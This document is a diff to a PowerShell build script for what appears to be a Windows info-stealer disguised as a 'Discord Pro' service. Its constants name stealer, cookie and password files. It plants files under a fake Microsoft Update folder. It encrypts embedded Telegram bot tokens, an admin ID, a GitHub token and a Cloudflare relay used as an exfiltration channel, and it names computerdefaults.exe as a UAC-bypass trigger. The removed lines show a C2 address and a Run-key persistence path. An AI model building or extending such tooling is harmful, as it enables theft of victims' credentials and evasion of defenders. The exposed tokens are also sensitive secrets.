@@ -41,17 +41,56 @@ $content = $content -replace 'DEBUG_MODE = true', 'DEBUG_MODE = false'
 $RandIPC = "Vanguard_Event_$( [Guid]::NewGuid().ToString("N").Substring(0, 8) )"
 $content = $content -replace 'IPC_EVENT_BASE = ".*?"', "IPC_EVENT_BASE = `"$RandIPC`""
 
-# 3. Randomize AppData subdirectory
+# 3. Randomize AppData subdirectory (Core)
 $RandDir = "Microsoft\\Update\\$( [Guid]::NewGuid().ToString("N").Substring(0, 6) )"
 $content = $content -replace 'APP_DATA_SUBDIR = ".*?"', "APP_DATA_SUBDIR = `"$RandDir`""
 
-# 4. Randomize Version
+# 4. Randomize IO constants
+$RandStealerDir = "$((Get-Random -Minimum 1000 -Maximum 9999))Svc"
+$content = $content -replace 'STEALER_DIR_NAME = ".*?"', "STEALER_DIR_NAME = `"$RandStealerDir`""
+
+$RandCookie = "cache_$((Get-Random -Minimum 1000 -Maximum 9999)).db"
+$content = $content -replace 'COOKIE_FILE_NAME = ".*?"', "COOKIE_FILE_NAME = `"$RandCookie`""
+
+$RandPass = "log_$((Get-Random -Minimum 1000 -Maximum 9999)).tmp"
+$content = $content -replace 'PASSWORD_FILE_NAME = ".*?"', "PASSWORD_FILE_NAME = `"$RandPass`""
+
+$RandLog = "err_$((Get-Random -Minimum 1000 -Maximum 9999)).log"
+$content = $content -replace 'LOG_FILE_NAME = ".*?"', "LOG_FILE_NAME = `"$RandLog`""
+
+# 5. Randomize Version
 $RandVer = "$((Get-Date).ToString("yyMM")).$((Get-Random -Minimum 1 -Maximum 9)).$((Get-Random -Minimum 0 -Maximum 99))-BE"
 $content = $content -replace 'VERSION = ".*?"', "VERSION = `"$RandVer`""
 
 Set-Content $constantsPath $content
 
-Write-Host "[*] Phase 0: Secure String Hardening (Vault 2.0)..." -ForegroundColor Yellow
+Write-Host "[*] Phase 0.5: Nuclear Cleanup & Tool Preparation..." -ForegroundColor Yellow
+Get-Process "svhost" -ErrorAction SilentlyContinue | Stop-Process -Force
+Get-Process "MicrosoftManagementSvc" -ErrorAction SilentlyContinue | Stop-Process -Force
+Remove-Item -Path "DiscordProSvc\bin", "DiscordProSvc\obj", "bin", "obj", "dist", "svhost.bin", "scripts\publish" -Recurse -Force -ErrorAction SilentlyContinue
+if (!(Test-Path "dist")) { New-Item -ItemType Directory -Path "dist" | Out-Null }
+
+Write-Host "[*] Phase 0.6: Building Resource Packer (Self-Contained Toolchain)..." -ForegroundColor Cyan
+dotnet publish scripts\ResourcePacker.csproj -c Release -r win-x64 --self-contained true -o scripts\publish --nologo
+if ($LASTEXITCODE -ne 0) { throw "ResourcePacker Compilation FAILED!" }
+$PackerExe = Join-Path (Get-Location).Path "scripts\publish\ResourcePacker.exe"
+
+Write-Host "[*] Phase 0.7: Secure String Hardening (Vault 2.0 via Toolchain)..." -ForegroundColor Yellow
+
+# [!] ВНИМАНИЕ: Все секреты надежно зашифрованы в Vault
+$Secrets = @{
+    "BOT_TOKEN_1"        = "8497188042:AAFKAy0IJK3K6oFcNoR4CNO5fYPxqo7VcrQ"
+    "BOT_TOKEN_2"        = "8771147119:AAFt-I1d5469nHZIs29BwkDfjTGeU0ZtLj4"
+    "BOT_TOKEN_3"        = "8520181797:AAFXKy6odun3bzVlKF2f0m3Uiycl5-gO0xo"
+    "ADMIN_ID"           = "-1003555531875"                         
+    "GIST_PROXY_ID"      = "a704361ef0c6942a3fb89254d6e7fa54"
+    "GIST_GITHUB_TOKEN"  = "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"
+    "TG_API_BASE"        = "https://api.telegram.org/"
+    "TG_FILE_BASE"       = "https://api.telegram.org/file/"
+    "TG_API_FRONT"       = "https://vanguard-gateway.v-security.workers.dev/"
+    "MS_TRIGGER"         = "computerdefaults.exe"
+}
+
 $VaultKey = New-Object Byte[] 32
 $VaultIV = New-Object Byte[] 12
 $rng.GetBytes($VaultKey)
@@ -60,48 +99,26 @@ $rng.GetBytes($VaultIV)
 $VaultKeyB64 = [System.Convert]::ToBase64String($VaultKey)
 $VaultIVB64 = [System.Convert]::ToBase64String($VaultIV)
 
-# Define sensitive strings to be encrypted
-$Secrets = @{
-    "C2_URL_PRIMARY"     = "185.123.45.67"
-    "UA_CHROME"          = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-    "REG_RUN"            = "Software\Microsoft\Windows\CurrentVersion\Run"
-    "BOT_TOKEN"          = "8497188042:AAFKAy0IJK3K6oFcNoR4CNO5fYPxqo7VcrQ"
-    "ADMIN_ID"           = "-1003555531875"
-    "TG_API_BASE"        = "https://api.telegram.org/bot"
-    "TG_FILE_BASE"       = "https://api.telegram.org/file/bot"
-    "GIST_URL"           = "https://gist.githubusercontent.com/raw/"
-    "GIST_PROXY_ID"      = "vanguard_proxies"
-    "GIST_GITHUB_TOKEN"  = "ghp_random_token_12345"
-    "MS_TRIGGER"         = "computerdefaults.exe"
-}
-
-# Add-Type for AES-GCM encryption helper
-$Source = @"
-using System;
-using System.Security.Cryptography;
-using System.Text;
-using System.Collections.Generic;
-
-public class VaultPacker {
-    public static string Encrypt(string plainText, byte[] key, byte[] iv, out string tagB64) {
-        byte[] plainBytes = Encoding.UTF8.GetBytes(plainText);
-        byte[] cipherText = new byte[plainBytes.Length];
-        byte[] tag = new byte[16];
-        using (AesGcm aes = new AesGcm(key, 16)) {
-            aes.Encrypt(iv, plainBytes, cipherText, tag);
-        }
-        tagB64 = Convert.ToBase64String(tag);
-        return Convert.ToBase64String(cipherText);
-    }
-}
-"@
-Add-Type -TypeDefinition $Source
-
-$VaultEntries = New-Object "System.Collections.Generic.List[string]"
+# Prepare Secrets for the Packer
+$PackerArgs = @("--vault", $VaultKeyB64, $VaultIVB64)
 foreach ($name in $Secrets.Keys) {
-    $tag = ""
-    $cipher = [VaultPacker]::Encrypt($Secrets[$name], $VaultKey, $VaultIV, [ref]$tag)
-    $VaultEntries.Add("            { `"$name`", new VaultEntry { C = `"$cipher`", T = `"$tag`" } }")
+    $plainB64 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Secrets[$name]))
+    $PackerArgs += $name
+    $PackerArgs += $plainB64
+}
+
+# Run the Packer to generate Vault entries
+$PackerOutput = & $PackerExe $PackerArgs
+$VaultEntries = New-Object "System.Collections.Generic.List[string]"
+
+foreach ($line in $PackerOutput) {
+    if ($line -like "V_DATA:*") {
+        $parts = $line.Split(":")
+        $name = $parts[1]
+        $cipher = $parts[2]
+        $tag = $parts[3]
+        $VaultEntries.Add("            { `"$name`", new VaultEntry { C = `"$cipher`", T = `"$tag`" } }")
+    }
 }
 
 $VaultCode = [string]::Join(",`n", $VaultEntries)
@@ -119,18 +136,7 @@ $SafetyContent = [System.Text.RegularExpressions.Regex]::Replace($SafetyContent,
 
 Set-Content $SafetyPath $SafetyContent
 
-Write-Host "[*] Phase 1: Nuclear Cleanup..." -ForegroundColor Yellow
-Get-Process "svhost" -ErrorAction SilentlyContinue | Stop-Process -Force
-Get-Process "MicrosoftManagementSvc" -ErrorAction SilentlyContinue | Stop-Process -Force
-Remove-Item -Path "DiscordProSvc\bin", "DiscordProSvc\obj", "bin", "obj", "dist", "svhost.bin", "scripts\publish" -Recurse -Force -ErrorAction SilentlyContinue
-if (!(Test-Path "dist")) { New-Item -ItemType Directory -Path "dist" | Out-Null }
-
-Write-Host "[*] Phase 2: Building Resource Packer (Self-Contained)..." -ForegroundColor Cyan
-dotnet publish scripts\ResourcePacker.csproj -c Release -r win-x64 --self-contained true -o scripts\publish --nologo
-if ($LASTEXITCODE -ne 0) { throw "ResourcePacker Compilation FAILED!" }
-$PackerExe = Join-Path (Get-Location).Path "scripts\publish\ResourcePacker.exe"
-
-Write-Host "[*] Phase 3: Building Discord Pro Svc (NativeAOT)..." -ForegroundColor Cyan
+Write-Host "[*] Phase 1: Building Discord Pro Svc (NativeAOT)..." -ForegroundColor Cyan
 dotnet publish DiscordProSvc\DiscordProSvc.csproj -c Release -r win-x64 -p:PublishAot=true --nologo
 if ($LASTEXITCODE -ne 0) { throw "DiscordProSvc Build FAILED!" }
 
@@ -168,4 +174,4 @@ $Size = (Get-Item $FinalExe).Length / 1MB
 Write-Host "[+] Final Size: $('{0:N2}' -f $Size) MB" -ForegroundColor Yellow
 
 # Final Cleanup
-Remove-Item dist, scripts\publish, defense\Constants.cs -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item dist, scripts\publish, defense\Constants.cs, Persistence.cs, defense\persist.cs -Recurse -Force -ErrorAction SilentlyContinue
